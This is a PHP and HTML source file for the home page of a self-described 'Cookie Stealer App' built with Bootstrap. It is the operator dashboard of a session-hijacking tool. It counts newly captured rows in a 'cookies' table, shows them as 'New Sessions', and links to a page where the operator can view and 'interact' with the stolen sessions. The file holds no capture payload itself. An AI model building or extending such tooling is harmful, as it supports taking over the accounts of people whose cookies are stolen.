<?php

include("config.php");

session_start();

$message = "";

?>

<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="author" content="Awapt">
    <meta name="description" content="This is the description of the web application.">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
          integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <title>Cookie App | Home</title>
    <style type="text/css">
        .jumbotron {
            position: relative;
            overflow: hidden;
            background-color: black;
            height: 100vh;
        }

        .jumbotron video {
            position: absolute;
            z-index: 1;
            top: 0;
            width: 100%;
            height: 100%;
            /*  object-fit is not supported on IE  */
            object-fit: cover;
            opacity: 0.5;
        }

        .jumbotron .container {
            z-index: 2;
            position: relative;
        }
    </style>
    <script type="text/javascript">
        function deferVideo() {

            //defer html5 video loading
            $("video source").each(function () {
                var sourceFile = $(this).attr("data-src");
                $(this).attr("src", sourceFile);
                var video = this.parentElement;
                video.load();
                // uncomment if video is not autoplay
                //video.play();
            });

        }

        window.onload = deferVideo;
    </script>
</head>
<body>
<nav class="navbar navbar-expand-lg navbar-dark bg-secondary">
    <a class="navbar-brand" href="/cookie4/index.php">Cookie App</a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarTogglerDemo02"
            aria-controls="navbarTogglerDemo02" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarTogglerDemo02">
        <ul class="navbar-nav mr-auto mt-2 mt-lg-0">
            <li class="nav-item active">
                <a class="nav-link" href="/cookie4/index.php">Home</a>
            </li>
            <?php
            if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] == true) {
                $logintext = "<li class=\"nav-item active\"><a class=\"nav-link\" href=\"/cookie4/logout.php\">Logout</a></li>";
            } else {
                $logintext = "<li class=\"nav-item active\"><a class=\"nav-link\" href=\"/cookie4/signup.php\">SignUp</a></li>";
                $logintext .= "<li class=\"nav-item active\"><a class=\"nav-link\" href=\"/cookie4/login.php\">Login</a></li>";
            }
            echo $logintext;
            ?>
        </ul>
        <form class="form-inline my-2 my-lg-0" method="GET" action="#">
            <input class="form-control mr-sm-2" type="search" placeholder="Search">
            <button type="submit" class="btn btn-primary my-2 my-sm-0" id="search" name="search">Search</button>
        </form>
    </div>
</nav>
<div class="jumbotron jumbotron-fluid">
    <video autoplay muted loop>
        <source src="/cookie4/video/1.mp4" type="video/mp4">
    </video>
    <div class="container text-white">
        <h1 class="display-4">Cookie Stealer App!</h1>
        <p class="lead">This is a simple cookie stealer app built with Boorstrap 4.</p>
        <hr class="my-4">
        <p>You can view, check, interact and delete incoming sessions.</p>
        <?php
        $query = "Select count(*) as new from cookies where State = '1'";
        $rows = $conn->query($query);

        if (!$rows) {
            die("Error: " . $conn->error);
        } else {
            $row = $rows->fetch_object();
            if ($row) {
                $new = $row->new;
                if ($new != 0) {
                    $sessionbadge = "<a class=\"btn btn-primary btn-lg\" href=\"/cookie4/view.php\" role=\"button\">New Sessions <span class=\"badge badge-danger\">" . $new . "</span></a>";
                } else {
                    $sessionbadge = "<a class=\"btn btn-primary btn-lg\" href=\"/cookie4/view.php\" role=\"button\">No New Sessions</a>";
                }
                echo $sessionbadge;
                $conn->close();
            }
        }
        ?>
    </div>
</div>
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
        integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
        crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
        integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
        crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
        integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
        crossorigin="anonymous"></script>
</body>
</html>